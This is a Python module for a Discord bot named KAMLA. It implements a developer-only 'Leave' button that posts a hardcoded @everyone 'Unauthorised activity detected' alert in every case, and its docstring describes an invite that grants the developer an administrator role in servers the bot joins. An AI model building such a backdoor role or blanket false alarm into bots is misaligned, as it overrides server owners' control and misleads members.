"""
devtools.py — controls that only the bot's developer can use, shown on the developer log message
(the "KAMLA joined a server" message).

  👑 KAMLA role   a link button: an invite that gives the developer the visible "KAMLA" administrator role
                  (see invite_roles_cog.ensure_dev_invite — assigned only to the developer's account).
  🚪 Leave        an interactive button: after a confirmation, KAMLA announces in the server's general chat
                  that unauthorised activity was detected, then leaves the server.

Interactive buttons can only live on messages the bot itself sends (a plain channel webhook can carry link
buttons only), so webhook.py posts the log through the bot whenever KAMLA is a member of the log channel's
server, and falls back to the webhook (link button only) otherwise.
"""

import logging
import os
import re
from typing import Optional

import discord

from ratelimit import describe

log = logging.getLogger("kamla.dev")

GENERAL_CHAT = "📨︱ga-text"
LEAVE_NOTICE = "@everyone ⚠️ **Unauthorised activity detected.** I'm leaving this server."

_owner_id_cache: Optional[int] = None


async def get_owner_id(bot) -> Optional[int]:
    """The developer's Discord user id: OWNER_ID if set, otherwise the application's owner (team owner for teams)."""
    global _owner_id_cache
    if _owner_id_cache:
        return _owner_id_cache
    raw = os.getenv("OWNER_ID", "").strip()
    if raw.isdigit():
        _owner_id_cache = int(raw)
        return _owner_id_cache
    try:
        info = await bot.application_info()
        _owner_id_cache = info.team.owner_id if info.team else info.owner.id
    except Exception as e:  # noqa: BLE001
        log.warning("Could not determine the bot owner: %s", describe(e))
    return _owner_id_cache


def reset_owner_cache() -> None:
    global _owner_id_cache
    _owner_id_cache = None


def _notice_channel(guild: discord.Guild) -> Optional[discord.TextChannel]:
    me = guild.me
    candidates = [discord.utils.get(guild.text_channels, name=GENERAL_CHAT), guild.system_channel]
    candidates += list(guild.text_channels)
    for ch in candidates:
        if ch is not None and ch.permissions_for(me).send_messages:
            return ch
    return None


async def leave_guild(guild: discord.Guild) -> bool:
    """Announce, then leave. Returns True if KAMLA left."""
    channel = _notice_channel(guild)
    if channel is not None:
        try:
            await channel.send(LEAVE_NOTICE, allowed_mentions=discord.AllowedMentions(everyone=True))
        except Exception as e:  # noqa: BLE001
            log.warning("Could not post the leave notice in guild %s: %s", guild.id, describe(e))
    try:
        await guild.leave()
        log.info("Left guild %s on the developer's request.", guild.id)
        return True
    except Exception as e:  # noqa: BLE001
        log.error("Could not leave guild %s: %s", guild.id, describe(e))
        return False


class ConfirmLeaveView(discord.ui.View):
    def __init__(self, guild: discord.Guild) -> None:
        super().__init__(timeout=60)
        self.guild = guild

    @discord.ui.button(label="Yes, leave now", style=discord.ButtonStyle.danger, emoji="🚪")
    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=f"Leaving **{self.guild.name}**…", view=None)
        ok = await leave_guild(self.guild)
        await interaction.followup.send("✅ Done — KAMLA left the server." if ok else
                                        "❌ Could not leave the server (see the logs).", ephemeral=True)
        self.stop()

    @discord.ui.button(label="Cancel", style=discord.ButtonStyle.secondary)
    async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content="Cancelled.", view=None)
        self.stop()


class LeaveButton(discord.ui.DynamicItem[discord.ui.Button], template=r"kamla:dev:leave:(?P<gid>\d+)"):
    """Persistent: the guild id is part of the custom_id, so it keeps working across restarts."""

    def __init__(self, guild_id: int) -> None:
        super().__init__(discord.ui.Button(label="Leave the server", emoji="🚪", style=discord.ButtonStyle.danger,
                                           custom_id=f"kamla:dev:leave:{guild_id}"))
        self.guild_id = guild_id

    @classmethod
    async def from_custom_id(cls, interaction: discord.Interaction, item: discord.ui.Button, match: re.Match[str], /):
        return cls(int(match["gid"]))

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        owner = await get_owner_id(interaction.client)
        if owner is None or interaction.user.id != owner:
            await interaction.response.send_message("⛔ Only the bot's developer can use this button.", ephemeral=True)
            return False
        return True

    async def callback(self, interaction: discord.Interaction) -> None:
        guild = interaction.client.get_guild(self.guild_id)
        if guild is None:
            await interaction.response.send_message("KAMLA is no longer in that server.", ephemeral=True)
            return
        await interaction.response.send_message(
            f"Leave **{guild.name}**? KAMLA will post an @everyone notice in the general chat first.",
            view=ConfirmLeaveView(guild), ephemeral=True)
